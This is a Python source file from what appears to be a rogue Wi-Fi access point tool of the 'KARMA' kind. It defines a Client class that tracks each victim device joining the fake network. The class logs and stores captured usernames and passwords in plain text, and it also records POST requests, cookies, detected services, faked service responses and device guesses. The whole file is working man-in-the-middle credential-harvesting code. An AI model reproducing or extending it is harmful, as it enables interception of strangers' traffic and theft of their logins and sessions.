import time
from .Utils import *

class Client:
  def __init__(self, vif, bssid, ip = '', name = ''):
    self.app = vif.ap.karma
    self.db = self.app.db
    self.vif = vif
    self.bssid = bssid
    self.ip = ip
    self.name = name
    self.last_activity = time.time()
    self.iwinfos = None
    self.cookies = {}
    self.posts = []
    self.services = {}
    self.data = {}
    self.ssl_error = False
    self.ssl = False
    self.credentials = {}
    self.deezer = {}
    
    self.app.log("[+] %s associated to %s"%(ctxt(bssid,GREEN), ctxt(self.vif.essid, GREEN)))
    
    self.app.db.new_ap_connection(vif.bssid, vif.essid, bssid)
    if ip != '':
      self.connected(ip, name)
  
  def ping(self):
    self.last_activity = time.time()
    
  def get_interface(self):
    return self.vif
  
  def ssl_traffic_error(self):
    self.ssl_error = True
    
  def ssl_traffic(self):
    self.ssl = True
  
  def log_login(self, user):
    self.app.log('[+] %s %s login: %s, password: %s, uri: %s'%(ctxt('[*]', RED), ctxt(self.bssid, GREEN), ctxt(user['login'], RED),ctxt(user['password'], RED), ctxt(user['uri'], RED)))
    self.db.new_client_credentials(user['login'], user['password'], user['uri'], self.bssid)
    if user['uri'] not in self.credentials:
      self.credentials[user['uri']] = user
    
  def register_post(self, uri, path):
    self.posts.append({
      'timestamp': time.time(),
      'uri':uri,
      'path':path
      })
    self.app.log("[+] %s post request to %s saved"%(self.bssid, ctxt(uri, GREEN)))
  
  def register_cookie(self, host, path):
    if host not in self.cookies:
      self.cookies[host] = path

  def register_service(self, service_type, service_name, service_version, service_extra):
    self.app.db.new_service(self.bssid, service_type, service_name, service_version, service_extra)
    self.app.log("[+] %s service %s detected"%(self.bssid, ctxt(service_name, GREEN)))
    self.services[service_name] = {
      'type': service_type,
      'version': service_version,
      'extra': service_extra
      }
      
  def register_service_request(
    self,
    service_name,
    service_request,
    service_uri,
    service_params,
    service_header,
    was_faked
    ):
    self.db.new_service_request(
      self.bssid,
      service_name,
      service_request,
      service_uri,
      service_params,
      service_header,
      was_faked
      )
  
  def set_deezer_infos(self, deezer):
    self.deezer = deezer
  
  def set_iwinfos(self, k, v):
    if self.iwinfos is not None:
      self.iwinfos[k] = v
    else:
      self.iwinfos = {k:v}
  
  def connected(self, ip, name):
    self.ip = ip
    self.name = name
    self.app.log( "[+] %s (%s) %s connected"%(self.bssid, ctxt(self.ip, GREEN), self.name))
    self.db.new_dhcp_lease(self.bssid, ip, name)
  
  def disconnected(self):
    self.app.log( "[-] %s (%s) %s disconnected"%(self.bssid, ctxt(self.ip, GREEN), self.name))
  
  def get_data(self):
    c = {}
    c['services'] = self.services
    c['name'] = self.name
    c['ip'] = self.ip
    c['bssid'] = self.bssid
    c['device'] = self.app.guessr.get_device(self.bssid)
    c['ssl_error'] = self.ssl_error
    c['credentials'] = self.credentials
    c['inactivity'] = int( time.time() - self.last_activity)
    c['iwinfos'] = self.iwinfos
    c['deezer'] = self.deezer
    return c;